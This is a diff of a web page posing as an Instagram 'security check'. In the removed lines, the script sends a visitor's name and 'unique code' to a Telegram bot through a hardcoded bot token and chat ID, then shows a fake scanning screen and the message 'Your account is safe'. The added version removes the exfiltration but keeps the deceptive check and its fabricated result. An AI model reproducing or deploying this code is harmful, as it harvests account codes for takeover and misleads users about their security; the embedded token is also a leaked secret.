@@ -3,156 +3,137 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instagram Security Check</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Final Form</title>
   <style>
-    body {
+    * {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
 
-    .form-container {
-      backdrop-filter: blur(15px);
-      background-color: rgba(255, 255, 255, 0.15);
+    body {
+      height: 100vh;
+      background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      backdrop-filter: blur(10px);
+      background: rgba(255, 255, 255, 0.1);
       border-radius: 20px;
       padding: 30px;
-      width: 90%;
-      max-width: 400px;
       box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
       text-align: center;
-      color: white;
+      color: #fff;
+      width: 90%;
+      max-width: 400px;
     }
 
     input {
-      width: 90%;
-      padding: 10px;
-      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
       border: none;
       border-radius: 10px;
+      margin-top: 15px;
       outline: none;
-      font-size: 16px;
-      background: rgba(255,255,255,0.2);
-      color: white;
-      position: relative;
     }
 
-    .input-container {
+    .input-wrapper {
       position: relative;
-      display: flex;
-      justify-content: center;
-      align-items: center;
     }
 
     .tick {
       position: absolute;
-      right: 30px;
-      font-size: 18px;
-      color: #00ff00;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: limegreen;
+      font-size: 20px;
       display: none;
     }
 
-    #loading, #final-message {
+    .hidden {
       display: none;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 10px;
+      background-color: #fff;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .loading-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 30px;
       color: white;
-      font-size: 18px;
-    }
-
-    #loading p {
-      animation: pulse 1s infinite;
-    }
-
-    @keyframes pulse {
-      0% { opacity: 0.2; }
-      50% { opacity: 1; }
-      100% { opacity: 0.2; }
     }
   </style>
 </head>
 <body>
-
-  <div class="form-container" id="form-screen">
-    <h2>KNOW IF YOUR INSTAGRAM IS HACKED OR NOT</h2>
-
-    <div class="input-container">
-      <input type="text" id="nameInput" placeholder="Enter your name" />
-      <span class="tick" id="tick1">✔</span>
+  <div class="container" id="form-container">
+    <h2>Enter Your Name</h2>
+    <div class="input-wrapper">
+      <input type="text" id="nameInput" placeholder="Your Name" />
     </div>
-
-    <div class="input-container" id="codeInputContainer" style="display:none;">
-      <input type="text" id="codeInput" placeholder="Enter your unique code" />
-      <span class="tick" id="tick2">✔</span>
+    <div class="hidden" id="codeSection">
+      <h2>Now Enter the Unique Code</h2>
+      <div class="input-wrapper">
+        <input type="text" id="codeInput" placeholder="Unique Code" />
+        <span class="tick" id="tick">✔</span>
+      </div>
+      <button id="submitBtn">Submit</button>
     </div>
   </div>
 
-  <div class="form-container" id="loading">
+  <div class="loading-screen" id="loadingScreen">
     <h2>Checking security of your account...</h2>
     <p>Do not close while processing</p>
   </div>
 
-  <div class="form-container" id="final-message">
-    <h2>Your account is safe</h2>
-  </div>
-
   <script>
-    const nameInput = document.getElementById("nameInput");
-    const codeInput = document.getElementById("codeInput");
-    const tick1 = document.getElementById("tick1");
-    const tick2 = document.getElementById("tick2");
-    const codeInputContainer = document.getElementById("codeInputContainer");
-    const formScreen = document.getElementById("form-screen");
-    const loading = document.getElementById("loading");
-    const finalMessage = document.getElementById("final-message");
+    const nameInput = document.getElementById('nameInput');
+    const codeSection = document.getElementById('codeSection');
+    const codeInput = document.getElementById('codeInput');
+    const tick = document.getElementById('tick');
+    const submitBtn = document.getElementById('submitBtn');
+    const formContainer = document.getElementById('form-container');
+    const loadingScreen = document.getElementById('loadingScreen');
 
-    nameInput.addEventListener("input", () => {
-      if (nameInput.value.trim().length >= 3) {
-        tick1.style.display = "block";
-        codeInputContainer.style.display = "block";
-      } else {
-        tick1.style.display = "none";
-        codeInputContainer.style.display = "none";
+    nameInput.addEventListener('change', () => {
+      if (nameInput.value.trim() !== '') {
+        codeSection.classList.remove('hidden');
       }
     });
 
-    codeInput.addEventListener("input", () => {
-      if (codeInput.value.trim().length >= 3) {
-        tick2.style.display = "block";
-
-        // Send message to Telegram
-        const name = nameInput.value.trim();
-        const code = codeInput.value.trim();
-        const text = `New Submission:\nName: ${name}\nCode: ${code}`;
-
-        fetch(`https://api.telegram.org/bot7712074719:AAEfsMkfDZFADCdnTq6S4WPT67c-XhHE_4Y/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: "7305039129",
-            text: text
-          })
-        });
-
-        setTimeout(() => {
-          formScreen.style.display = "none";
-          loading.style.display = "block";
-
-          setTimeout(() => {
-            loading.style.display = "none";
-            finalMessage.style.display = "block";
-          }, 10000);
-        }, 500);
+    codeInput.addEventListener('input', () => {
+      if (codeInput.value.trim().length > 3) {
+        tick.style.display = 'inline';
       } else {
-        tick2.style.display = "none";
+        tick.style.display = 'none';
       }
+    });
+
+    submitBtn.addEventListener('click', () => {
+      formContainer.style.display = 'none';
+      loadingScreen.style.display = 'flex';
+
+      setTimeout(() => {
+        loadingScreen.innerHTML = '<h2>Your account is safe</h2>';
+      }, 10000);
     });
   </script>
-
 </body>
 </html>
